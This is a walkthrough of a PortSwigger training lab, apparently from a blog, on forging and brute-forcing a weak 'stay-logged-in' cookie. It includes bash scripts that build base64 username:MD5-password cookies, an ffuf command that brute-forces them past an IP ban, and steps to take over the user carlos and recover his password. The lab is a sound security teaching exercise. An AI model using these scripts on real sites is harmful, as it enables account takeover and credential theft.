---
title: "Portswigger Lab: Brute-forcing a stay-logged-in cookie"
date: 2024-09-23T10:59:43-05:00
draft: false
tags: 
- PortSwigger
- Cookies
- Web Security
- Broken Authentication
---

## Description
The "Brute-forcing a stay-logged-in cookie" lab by PortSwigger features a web application whose stay-logged-in cookies are vulnerable to attack. 


## Walkthrough
Navigate to the login page under "My account". We will first create a stay-logged-in cookie with the user credentials given to us. Make sure check "Stay logged in".

![Login and enable persistent cookies](/img/portswigger/cookie-brute/stay_logged_in.png)

Now we can copy the cookie to analyze. Hit ```Ctr-Shift-i``` to open the Developer Tools panel and head to the "Storage" section. The value for the "stay-logged-on" field is our cookie.

![Stay-logged-in cookie](/img/portswigger/cookie-brute/stay_logged_in_cookie.png)

The cookie is encoded in base64. Decoding it reveals that it is composed of the our username, ":", and a hash. 

```
┌──(kali㉿kali)-[/tmp]
└─$ echo 'd2llbmVyOjUxZGMzMGRkYzQ3M2Q0M2E2MDExZTllYmJhNmNhNzcw' | base64 -d                                    
wiener:51dc30ddc473d43a6011e9ebba6ca770
```

Given that our username was used as part of the cookie, we can reasonably infer that the hash is based on a predictable value like a timestamp, password, or maybe even the username again. In this case, it's the MD5 hash of our password. We can confirm this by hashing our password using MD5 and verifying it is identical to the hash in our cookie.

```
┌──(kali㉿kali)-[/tmp]
└─$ echo -n 'peter' | md5sum | cut -d ' ' -f1 
51dc30ddc473d43a6011e9ebba6ca770
```

We have now determined that the stay-logged-in cookie is ```username:<password MD5 hash>``` and base64-encoded. Since we have already been given a [list of passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords), we can create a list of potential cookies for ```carlos``` by applying these rules. I provided a script that does this and saves the cookies into ```cookies.txt```.

```shell
#!/bin/bash

# md5 hash -> user:<hash> -> base64 cookie

while read -r line
do
        hash=$(printf "$line" | md5sum | cut -d ' '  -f1)
        cookie=$(printf "carlos:$hash" | base64)
        echo "$cookie" >> cookies.txt
done <<< $(cat pass.txt)
```

Now we can brute force the stay-logged-in cookie for ```carlos```. Logout and start Burp Suite. We are going to login again as ```wiener``` again, but this time we are going to intercept our web requests. Forward the POST request but capture the GET request for your account details.

![Web request](/img/portswigger/cookie-brute/persistent_logon.png)

Copy it and save it into a file. Change the ```id``` query string's value to ```carlos``` and replace the stay-logged-in cookie with ```FUZZ```. Now, we can brute force the cookie.

```
ffuf -request request.txt -request-proto https -mode clusterbomb -w cookies.txt:FUZZ -r
```

We see a change in the webserver's response after supplying one of the cookies.

![Cookie brute force](/img/portswigger/cookie-brute/success.png)

Now we can simply use our cookie to take over  ```carlos```. Once again, we open the developer tools and head to storage > cookies. Right click and add another item with the name as "stay-logged-in" and the value as the cookie we got. 

![Add carlos' cookie](/img/portswigger/cookie-brute/add_cookie.png)

Refresh the page and we are now logged in as ```carlos```.

![Takeover success](/img/portswigger/cookie-brute/carlos_pwned.png)

***
## Beyond Pwn
Note that finding the cookie for ```carlos``` is similar to a password dictionary attack. In this particular though, there is a IP ban for incorrect login attempts. By brute forcing the cookie instead of password, we are able to bypass the IP ban.

Also worth mentioning is that we can also get the ```carlos``` user's password while brute forcing his cookie. 

```shell
#!/bin/bash

# md5 hash -> user:<hash> -> base64 cookie && cookie-password map

while read -r line
do
        hash=$(printf "$line" | md5sum | cut -d ' '  -f1)
        cookie=$(printf "carlos:$hash" | base64)
        echo "$cookie" >> cookies.txt
        echo "$cookie: $line" >> map.txt
done <<< $(cat pass.txt)
```

Once we successfully authenticate with a cookie, we can find its corresponding password through the map.

```
┌──(kali㉿kali)-[/tmp]
└─$ grep 'Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx' map.txt                    
Y2FybG9zOmVmNmU2NWVmYzE4OGU3ZGZmZDczMzViNjQ2YTg1YTIx: thomas
```

This can be useful when checking for password reuse and may help us access more services in a real engagement.
